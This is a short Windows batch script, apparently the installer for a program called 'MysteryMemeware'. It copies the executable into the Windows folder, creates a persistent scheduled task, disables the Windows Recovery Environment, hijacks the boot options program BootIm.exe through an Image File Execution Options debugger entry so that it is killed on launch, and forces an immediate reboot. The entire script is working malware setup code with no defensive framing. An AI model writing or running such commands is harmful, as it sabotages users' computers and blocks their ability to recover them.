%WinDir%\System32\XCopy.exe /Y %~dp0\MysteryMemeware.exe %WinDir%\..\MysteryMemeware.exe
%WinDir%\System32\SchTasks.exe /create /f /tn MysteryTask /xml %~dp0\MysteryTask.xml
%WinDir%\System32\ReAgentc.exe /Disable
%WinDir%\System32\Reg.exe add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BootIm.exe" /v Debugger /t REG_SZ /f /d "%WinDir%\System32\TaskKill.exe /F /IM BootIm.exe"
%WinDir%\System32\ShutDown.exe /f /r /t 0